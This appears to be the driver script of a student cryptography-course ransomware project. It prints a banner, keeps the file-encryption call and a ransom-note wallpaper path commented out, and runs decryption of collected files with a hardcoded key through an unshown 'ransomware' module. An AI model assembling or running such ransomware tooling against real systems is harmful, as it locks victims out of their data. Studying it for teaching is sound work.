from Crypto.PublicKey import RSA
import  rsa
import os
import ctypes
from ransomware import ransomware
class colors:
    def __init__(self):
        self.blue = "\033[94m"
        self.red = "\033[91m"
        self.color="\033[93m"
        self.green= "\033[92m"
        self.end = "\033[0m"
cl = colors()
print(cl.blue + """

\t         -----------------------------------
\t         \                                 / 
\t          \                               / 
\t           \          RANSOMEWHERE       /  
\t            \         **FC421**         / 
\t             \_________________________/   

\t             FC421 CRYPTOGRAPHY PROJECT
\t            For: Dr.Mohammad Abdulrahman
""" + cl.green+"\t\t\t\tBY:Renad,Haya,Sondos,Mariam\n")

#wallpaper_path="/home/mariam/Desktop/ransomnote.jpeg"
list_f = []
list_d = []
print(cl.color+"ENCRYPTING FILES ;(" + cl.end)
#ransomware.encryptor(ransomware.getFile(list_f))
#x=open('/home/kali/RanSomeWhere/plain','rb')
#key=x.read()
#print(key)
key=b'\xacAm\x98f\xf1\x08\xbea\x9f\x99*\xa0\xf7\xd1m\xd7\xc7\x16\x85C\x1e\x11\xd1\xeeo\x87\x14\xc8_\xac\x7f'
ransomware.decrypt(ransomware.getFile(list_d),key)
